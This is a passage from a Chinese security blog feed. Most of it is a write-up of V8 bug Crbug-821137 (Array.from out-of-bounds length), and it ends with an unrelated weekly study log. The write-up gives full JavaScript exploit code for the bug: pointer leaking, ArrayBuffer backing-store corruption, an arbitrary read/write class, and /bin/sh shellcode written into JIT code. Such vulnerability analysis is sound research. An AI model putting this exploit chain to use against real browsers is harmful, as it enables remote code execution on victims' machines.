&amp;gt; Array [0, 1, 2, 3, 4, 5, 6, 7, 8]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再回到源码，我们看到最后有一个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenerateSetLength()&lt;/code&gt;用于设置输出函数的长度&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 迭代结束跳到这里
BIND(&amp;amp;finished);

// 设置输出数组的长度
// Finally set the length on the output and return it.
GenerateSetLength(context, array.value(), length.value());
args.PopAndReturn(array.value());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;确定该函数三个参数：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;第一个参数是运行环境上下文&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;context&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;第二个参数是已经被修改的原始数组&lt;/li&gt;
  &lt;li&gt;第三个参数是迭代次数，以我们目前的Poc为标准就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1024 * 1024 * 8&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;跟入该函数，进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fast&lt;/code&gt;那个分支&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void GenerateSetLength(TNode&amp;lt;Context&amp;gt; context, TNode&amp;lt;Object&amp;gt; array,
                         TNode&amp;lt;Number&amp;gt; length) {
    Label fast(this), runtime(this), done(this);
    // Only set the length in this stub if
    // 1) the array has fast elements,
    // 2) the length is writable,
    // 3) the new length is greater than or equal to the old length.

    // 1) Check that the array has fast elements.
    // TODO(delphick): Consider changing this since it does an an unnecessary
    // check for SMIs.
    // TODO(delphick): Also we could hoist this to after the array construction
    // and copy the args into array in the same way as the Array constructor.
    BranchIfFastJSArray(array, context, &amp;amp;fast, &amp;amp;runtime);

    BIND(&amp;amp;fast);
    {
      // 进入这里，获取数组为fast_array
      // [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
      TNode&amp;lt;JSArray&amp;gt; fast_array = CAST(array);

      // 迭代的次数，注意，是迭代的次数：1024 * 1024 * 8
      TNode&amp;lt;Smi&amp;gt; length_smi = CAST(length);
      // 这里获取的是该数组自己的长度，结合Poc来看，这里已经被改为0了
      // 有一点需要注意，因为我们是在JS代码里将数组长度改为0，这是正规操作
      // 也就是说，我们在迭代结束的时候，修改了数组长度，由引擎来做的操作，数组是会缩小的
      // 假如原来有100个长度，我们迭代结束后，改为10个，那么这个数组就只剩10个长度
      // 第11个开始就是其它对象的数据
      // 所以old_length的值取决于我们最后设置的值
      TNode&amp;lt;Smi&amp;gt; old_length = LoadFastJSArrayLength(fast_array);
      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));

      // 2) Ensure that the length is writable.
      // TODO(delphick): This check may be redundant due to the
      // BranchIfFastJSArray above.
      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;amp;runtime);

      // 3) If the created array already has a length greater than required,
      //    then use the runtime to set the property as that will insert holes
      //    into the excess elements and/or shrink the backing store.
      // 如果length_smi小于old_length就跳去runtime分支执行动态修改数组长度操作
      // 也就是迭代的次数小于传入数组的长度，假如我传入一个100长度的数组，但是只迭代了5个
      // 但是我生成的数组长度还是100，所以需要优化长度
      // 作者的想法：如果等于就直接把迭代次数写入，也就是说迭代次数等于数组长度
      // 可是作者没有想到，如果迭代完，传入数组长度被修改
      // 估计作者更没有想到传入的会是初始数组本身
      // 如同我们这里的数据，迭代次数length_smi为1024 * 1024 * 8，但是old_length迭代完被改为0或者很小的数据
      // 这就造成了内存里，一个长度为很小的数据的数组的长度字段被直接覆写为很大的值（取决于迭代次数）
      // 此时拥有了一个非常好用的越界读写
      GotoIf(SmiLessThan(length_smi, old_length), &amp;amp;runtime);

      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                     length_smi);

      Goto(&amp;amp;done);
    }

    BIND(&amp;amp;runtime);
    {
      CallRuntime(Runtime::kSetProperty, context, static_cast&amp;lt;Node*&amp;gt;(array),
                  CodeStubAssembler::LengthStringConstant(), length,
                  SmiConstant(LanguageMode::kStrict));
      Goto(&amp;amp;done);
    }

    BIND(&amp;amp;done);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看补丁，如果迭代次数和数组长度不等，就跳到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt;分支&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &amp;amp;runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;amp;runtime);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;漏洞原因分析就到此为止了，接下来我们来分析如何进行漏洞利用&lt;/p&gt;

&lt;p&gt;这里学习下V8数组对象的内存结构&lt;/p&gt;

&lt;p&gt;常规的Array对象，它由四个字段组成，第一个字段是Map，第三个字段是指向一个FixedArray的指针，这个FixedArray存储着真正的数据，当然&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elem[0]......&lt;/code&gt;存储的是数据还是指针就不一定了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FDE6A78FF2BD3FCDE4E694A21DBB9F10.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么我们知道内存里有一个可以越界读写的数组，那么这个数组能读写到哪些东西呢？&lt;/p&gt;

&lt;p&gt;我们来做个测试，如下我们修改Poc，在最前面定义一个数组对象&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objs&lt;/code&gt;，同时为了防止我们的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oobArray&lt;/code&gt;被回收掉，将长度改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;，并且在迭代结束之后往&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objs&lt;/code&gt;加100个对象，每个对象里面写上我们要泄漏的数据，然后利用越界读去暴搜，这里我们将要泄漏的对象写为函数指针&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function func_to_overwrite() {
    let sum = 0;
    for (let i = 0;i &amp;lt; 0x100; i++) {
        sum += i;
    }
    return sum;
}

for (let i = 0; i &amp;lt; 1000; i++) {
    func_to_overwrite();
}

console.log(&quot;======&amp;gt; func_to_overwrite&quot;);
%DebugPrint(func_to_overwrite);

let maxSize = 1024 * 8;
let objs = [];
let oobArray = [1.1];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        next() {
            let result = this.counter++;
            if (this.counter == maxSize) {
                oobArray.length = 5;
                for (let i = 0; i &amp;lt; 100; i++) {
                    let obj = {'a': 0x4321, 'b': func_to_overwrite};
                    objs.push(obj);
                }
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });

let jit_func_obj_ptr = 0;
for (let i = 0; i &amp;lt; maxSize; i++) {
    let val = Int64.fromDouble(oobArray[i]);
    if (val == 0x432100000000) {
        console.log('Found', i);
        jit_func_obj_ptr = Int64.fromDouble(oobArray[i + 1]) - 1;
        console.log('JIT Function Pointer: 0x' + jit_func_obj_ptr.toString(16));
        break;
    }
}

console.log(&quot;======&amp;gt; objs&quot;);
%DebugPrint(objs);

console.log(&quot;======&amp;gt; oobArray&quot;);
%DebugPrint(oobArray);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出如下，可以看到我们搜到的函数指针和调试打印出来的函数指针一样&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  gn git:(1dab065bb4) ✗ ./d8 --allow-natives-syntax Poc.js     
======&amp;gt; func_to_overwrite
DebugPrint: 0x228b18b298d9: [Function] in OldSpace
 - map: 0x228be2d02519 &amp;lt;Map(HOLEY_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: 0x228b18b04611 &amp;lt;JSFunction (sfi = 0x228b52305559)&amp;gt;
 - elements: 0x228b52302251 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
 - function prototype: 
 - initial_map: 
 - shared_info: 0x228b18b282e1 &amp;lt;SharedFunctionInfo func_to_overwrite&amp;gt;
 - name: 0x228b18b27591 &amp;lt;String[17]: func_to_overwrite&amp;gt;
 - formal_parameter_count: 0
 - kind: NormalFunction
 - context: 0x228b18b29489 &amp;lt;FixedArray[9]&amp;gt;
 - code: 0x1af9bdb5f041 &amp;lt;Code OPTIMIZED_FUNCTION&amp;gt;
 - source code: () {
    let sum = 0;
    for (let i = 0;i &amp;lt; 0x100; i++) {
        sum += i;
    }
    return sum;
}

Found 258
JIT Function Pointer: 0x228b18b298d8

======&amp;gt; objs
DebugPrint: 0x228b31286141: [JSArray]
 - map: 0x228be2d02729 &amp;lt;Map(PACKED_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: 0x228b18b05539 &amp;lt;JSArray[0]&amp;gt;
 - elements: 0x228b31294051 &amp;lt;FixedArray[140]&amp;gt; [PACKED_ELEMENTS]
 - length: 100
 - properties: 0x228b52302251 &amp;lt;FixedArray[0]&amp;gt; {
    #length: 0x228b5234ff89 &amp;lt;AccessorInfo&amp;gt; (const accessor descriptor)
 }
 - elements: 0x228b31294051 &amp;lt;FixedArray[140]&amp;gt; {
           0: 0x228b31294821 &amp;lt;Object map = 0x228be2d0da99&amp;gt;
           1: 0x228b31294849 &amp;lt;Object map = 0x228be2d0da99&amp;gt;
           2: 0x228b31294871 &amp;lt;Object map = 0x228be2d0da99&amp;gt;

            ......
            
          97: 0x228b31295749 &amp;lt;Object map = 0x228be2d0da99&amp;gt;
          98: 0x228b31295771 &amp;lt;Object map = 0x228be2d0da99&amp;gt;
          99: 0x228b31295799 &amp;lt;Object map = 0x228be2d0da99&amp;gt;
     100-139: 0x228b52302321 &amp;lt;the_hole&amp;gt;
 }

======&amp;gt; oobArray
DebugPrint: 0x228b31286161: [JSArray]
 - map: 0x228be2d02679 &amp;lt;Map(PACKED_DOUBLE_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: 0x228b18b05539 &amp;lt;JSArray[0]&amp;gt;
 - elements: 0x228b31294019 &amp;lt;FixedDoubleArray[5]&amp;gt; [PACKED_DOUBLE_ELEMENTS]
 - length: 8191
 - properties: 0x228b52302251 &amp;lt;FixedArray[0]&amp;gt; {
    #length: 0x228b5234ff89 &amp;lt;AccessorInfo&amp;gt; (const accessor descriptor)
 }
 - elements: 0x228b31294019 &amp;lt;FixedDoubleArray[5]&amp;gt; {
           0: 0
           1: 1
           2: 2
           3: 3
           4: 4
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么现在可以泄漏出函数指针了，但是为什么我们要泄漏出函数指针呢？&lt;/p&gt;

&lt;p&gt;我们来看V8里函数对象的内存结构，在其偏移为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30&lt;/code&gt;的位置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code&lt;/code&gt;字段，该指针加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x5F&lt;/code&gt;的偏移为该函数JIT代码，所以如果我们泄漏出该函数指针，加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30&lt;/code&gt;的偏移，读到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code&lt;/code&gt;字段的值，再利用一个任意读原语，就可以读到JIT代码的指针，然后利用任意写原语，把ShellCode写进去，这样当我们调用这个函数的时候，就会执行我们的ShellCode&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/27F2B1E1CCF6F2108FA57ECDA9625E51.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们现在拥有的能力是读到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code&lt;/code&gt;字段的值，但是我们需要读&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code+0x5F&lt;/code&gt;的值，那么如何构造任意读和任意写的原语呢？&lt;/p&gt;

&lt;p&gt;这里要提到另一种数组TypedArray，比如uint8Array，uint32Array之类的，它有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArrayBuffer&lt;/code&gt;字段，这种数组的真实数据存储在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArrayBuffer&lt;/code&gt;字段指向的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backing Store&lt;/code&gt;字段指向的内存&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A3F2D443428D4E57BAFA840DFF68097D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们如果可以修改掉ArrayBuffer的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backing Store&lt;/code&gt;，那么我们对ArrayBuffer的操作，就可以变成对任意有权限读写的地址的操作&lt;/p&gt;

&lt;p&gt;如下修改Poc，我们在迭代结束后，在内存里加入一百个ArrayBuffer对象，然后对后面的内存进行暴搜，标志位是长度&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;，然后我们将长度位改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1212&lt;/code&gt;用于标记是哪个ArrayBuffer被修改&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function func_to_overwrite() {
    let sum = 0;
    for (let i = 0;i &amp;lt; 0x100; i++) {
        sum += i;
    }
    return sum;
}

for (let i = 0; i &amp;lt; 1000; i++) {
    func_to_overwrite();
}

console.log(&quot;======&amp;gt; func_to_overwrite&quot;);
%DebugPrint(func_to_overwrite);

let maxSize = 1024 * 8;
let bufs = [];
let objs = [];
let oobArray = [1.1];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ =&amp;gt; (
    {
        counter : 0,
        next() {
            let result = this.counter++;
            if (this.counter == maxSize) {
                oobArray.length = 5;
                for (let i = 0; i &amp;lt; 100; i++) {
                    bufs.push(new ArrayBuffer(0x1234));
                    let obj = {'a': 0x4321, 'b': func_to_overwrite};
                    objs.push(obj);
                }
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
) });

let jit_func_obj_ptr = 0;
console.log(maxSize);
for (let i = 0; i &amp;lt; maxSize; i++) {
    let val = Int64.fromDouble(oobArray[i]);
    if (val == 0x432100000000) {
        console.log('Found', i);
        jit_func_obj_ptr = Int64.fromDouble(oobArray[i + 1]) - 1;
        console.log('JIT Function Pointer: 0x' + jit_func_obj_ptr.toString(16));
        for (let j = i + 2; j &amp;lt; i + 100; j++) {
            console.log(&quot;0x&quot; + Int64.fromDouble(oobArray[j]).toString(16));
        }
        break;
    }
}

for (let i = 0; i &amp;lt; maxSize; i++) {
    let val = Int64.fromDouble(oobArray[i]);
    if (val == 0x123400000000) {
        console.log('Found ArrayBuffer');
        changed_idx = i;
        oobArray[i] = (new Int64(0x121200000000)).asDouble();
        oobArray[i + 3] = (new Int64(0x1212)).asDouble();
        break;
    }
}

console.log(&quot;======&amp;gt; objs&quot;);
%DebugPrint(objs);

console.log(&quot;======&amp;gt; oobArray&quot;);
%DebugPrint(oobArray);

console.log(&quot;======&amp;gt; bufs&quot;);
%DebugPrint(bufs);

while(1);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufs&lt;/code&gt;里面的第一个元素&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;======&amp;gt; bufs
DebugPrint: 0x25e084d8aa31: [JSArray] in OldSpace
 - map: 0x25e0f0002729 &amp;lt;Map(PACKED_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: 0x25e0bd805539 &amp;lt;JSArray[0]&amp;gt;
 - elements: 0x25e084d94121 &amp;lt;FixedArray[140]&amp;gt; [PACKED_ELEMENTS]
 - length: 100
 - properties: 0x25e0b2b82251 &amp;lt;FixedArray[0]&amp;gt; {
    #length: 0x25e0b2bcff89 &amp;lt;AccessorInfo&amp;gt; (const accessor descriptor)
 }
 - elements: 0x25e084d94121 &amp;lt;FixedArray[140]&amp;gt; {
           0: 0x25e084d94691 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
           1: 0x25e084d946e1 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
           2: 0x25e084d94731 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
           3: 0x25e084d94781 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
           4: 0x25e084d947d1 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
           5: 0x25e084d94821 &amp;lt;ArrayBuffer map = 0x25e0f0003fe9&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打印一下内存数据，可以看到第四个字段就是长度了，这里已经被我们改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1212&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(lldb) x/20xg 0x25e084d94690
0x25e084d94690: 0x000025e0f0003fe9 0x000025e0b2b82251
0x25e084d946a0: 0x000025e0b2b82251 0x0000121200000000
0x25e084d946b0: 0x0000000102020c00 0x0000000102020c00
0x25e084d946c0: 0x0000000000001212 0x0000000000000004
0x25e084d946d0: 0x0000000000000000 0x0000000000000000
0x25e084d946e0: 0x000025e0f0003fe9 0x000025e0b2b82251
0x25e084d946f0: 0x000025e0b2b82251 0x0000123400000000
0x25e084d94700: 0x000000010202f400 0x000000010202f400
0x25e084d94710: 0x0000000000001234 0x0000000000000004
0x25e084d94720: 0x0000000000000000 0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;好啦，到这里我们解释下如何利用这个ArrayBuffer进行构造任意读和任意写&lt;/p&gt;

&lt;p&gt;这是我们目前构造出的内存对象分部图，左边表示&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oobArray&lt;/code&gt;，中间是内存地址，与上面打印出来的地址对应，右边是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArrayBuffer[0]&lt;/code&gt;的结构对应，所以我们暴搜找到原始数组长度&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x123400000000&lt;/code&gt;，此时记录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt;，这样&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oobArray[i+1]&lt;/code&gt;就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backing Store&lt;/code&gt;字段，而把长度改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1212&lt;/code&gt;是因为我们现在有一百个ArrayBuffer，所以需要定位到我们当前这个ArrayBuffer，那么修改长度之后，再对一百个ArrayBuffer进行遍历长度，就可以找到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufs[j].kByteLengthOffset&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000121200000000&lt;/code&gt;，此时记录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1458D088F0470125D5E17D32ACE47BF4.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;构造读写原语的方式就出来了：利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oobArray[i+1]&lt;/code&gt;修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufs[j].kBackingStoreOffset&lt;/code&gt;，然后用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bufs[j]&lt;/code&gt;创建一个TypedArray，通过TypedArray进行读写，这样读写的地址就会变成我们修改的地址，也就构造出了任意读写原语&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let arw = null;

for (let i = 0; i &amp;lt; bufs.length; i++) {
    if (bufs[i].byteLength == 0x1212) {
        class ArbitraryReadWrite {
            constructor(changed_idx_oob, changed_idx_bufs) {
                this.idx_in_oob_arr = changed_idx_oob;
                this.idx_in_bufs_arr = changed_idx_bufs;
            }

            read(addr) {
                let i = this.idx_in_oob_arr;
                oobArray[i + 1] = addr.asDouble();
                oobArray[i + 2] = addr.asDouble();
                let arr = new Float64Array(bufs[this.idx_in_bufs_arr], 0, 0x10);
                return Int64.fromDouble(arr[0]);
            }

            write(addr, vals) {
                let i = this.idx_in_oob_arr;
                oobArray[i + 1] = (new Int64(addr)).asDouble();
                oobArray[i + 2] = (new Int64(addr)).asDouble();
                let arr = new Uint8Array(bufs[this.idx_in_bufs_arr]);
                arr.set(vals);
            }
        }

        arw = new ArbitraryReadWrite(changed_idx, i);
        break;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以可以任意读写之后，我们通过读原语读出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code + 0x5F&lt;/code&gt;的值，这个值就是JIT代码的地址，我们通过写原语将ShellCode写进去，最后进行函数调用即可完成RCE&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let code_addr = arw.read(Add(jit_func_obj_ptr, 0x30));
let jit_code_addr = Add(code_addr, 0x5F);

shell = [0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xd2, 0x48, 0x31, 0xc0, 0xb0, 0x02, 0x48, 0xc1, 0xc8, 0x28, 0xb0, 0x3b, 0x0f, 0x05];
arw.write(jit_code_addr, shell);
func_to_overwrite();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EA65963349864776D36CDD0F382F1321.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;p&gt;扔个骰子学v8 - 从Plaid CTF roll a d8开始&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/147829#h3-4&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;补丁&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromium.googlesource.com/v8/v8/+/b5da57a06de8791693c248b7aafc734861a3785d%5E%21/#F0&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Tue, 16 Apr 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/04/16/BUG-821137-Array.from-OOB.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/04/16/BUG-821137-Array.from-OOB.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.04.08 - 2019.04.12</title>
                <description>&lt;p&gt;PJ0写的Chrome沙箱逃逸分析文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;微软放出了基于Chromium的EDGE版本，emmmmmmmm，挖Chakra的大佬们是不是要换一个引擎搞了？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.microsoftedgeinsider.com/en-us/download&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这周看的比较杂，跟着b站上面的JS视频学着，一百多节课，现在还在基础区，一点五倍速，之前没有系统的学习过JS，所以现在仔细的跟着这种培训视频完整的学习一下，底子还是要扎实&lt;/p&gt;

&lt;p&gt;编译原理也是在b站上面学的，还在学，两倍速，那个老师实在是讲的太慢了&lt;/p&gt;

&lt;p&gt;（怎么感觉我上b站都是在学习，我的吉他指弹，做菜，切水果这些也是）&lt;/p&gt;

&lt;p&gt;跟着V8官方博客学习了CodeStubAssembler的语法&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://v8.dev/docs/csa-builtins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这篇文章里的代码在我这里其实是跑不起来的，可能是版本问题吧，我改了好几处，但是还是有一个地方有问题，我后来改了一下逻辑，跑起来了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第一处：
SimpleInstallFunction(math, &quot;is42&quot;, Builtins::kMathIs42, 1, true);
=&amp;gt;
SimpleInstallFunction(isolate_, math, &quot;is42&quot;, Builtins::kMathIs42, 1, true);

第二处：
TFJ(MathIs42, 1, kX)
=&amp;gt;
TFJ(MathIs42, 1, kReceiver, kX)

第三处一直报错，我改成恒成立了：
var_result.Bind(SelectBooleanConstant(SmiEqual(number, SmiConstant(42))));
=&amp;gt;
var_result.Bind(SelectBooleanConstant(SmiEqual(SmiConstant(42), SmiConstant(42))));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;仔细的读了读代码之后，对之前看的CSA代码突然有了不一样的理解，之前看的实在是太糊了&lt;/p&gt;

&lt;p&gt;接下来再把之前的几个洞（比如Crbug-821137）CSA代码看看，之前看的一知半解的&lt;/p&gt;

&lt;p&gt;再看了一遍R大关于学习JS引擎的回答，真厉害啊！&lt;/p&gt;

&lt;p&gt;（听说R大是在玄武？）&lt;/p&gt;

&lt;p&gt;这里放几个R大的回答：&lt;/p&gt;

&lt;p&gt;RednaxelaFX写的文章/回答的导航帖&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/25042028&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;新手上路学习JavaScript引擎实现——路线图&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/20505562&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;各JavaScript引擎的简介，及相关资料/博客收集帖&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://hllvm-group.iteye.com/group/topic/37596&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;学习编程语言与编译优化的一个书单&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/20130808&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R大的这几个链接里的内容真是常看常新，我实在是太垃圾了&lt;/p&gt;

&lt;p&gt;（我是绝对不会说我最近还在b站上面学习C++的！）&lt;/p&gt;

&lt;p&gt;还在看R大的一个回答，关于JIT算法&lt;/p&gt;

&lt;p&gt;有哪些常用 JIT 算法？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zhihu.com/question/54748092/answer/141903877&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后再扯几句别的：&lt;/p&gt;

&lt;p&gt;是不是觉得我今天放了很多学习的资料？&lt;/p&gt;

&lt;p&gt;不是我之前不放啊，真的是我不知道该看什么，很多资料不敢看，因为东一块西一块的，看了也不知道有什么用，导致了学习进度缓慢&lt;/p&gt;

&lt;p&gt;现在我想通了，不管是什么资料，强行先看下来，书读百遍其义自现，刚毕业两年我还有的是时间，走你！&lt;/p&gt;

&lt;p&gt;现在的计划还是先把编译原理啃下来，同时JS和C++怎么也得学到进阶的部分，如R大说的，先跟着《自制编程语言》走一波，把这玩意的框架理解了，都有哪些部分，每部分的作用是什么，代码如何实现，都用到哪些算法，再去自己实现一个，读一些轻量级的引擎学习理解别人的实现思路&lt;/p&gt;

&lt;p&gt;感谢R大！&lt;/p&gt;

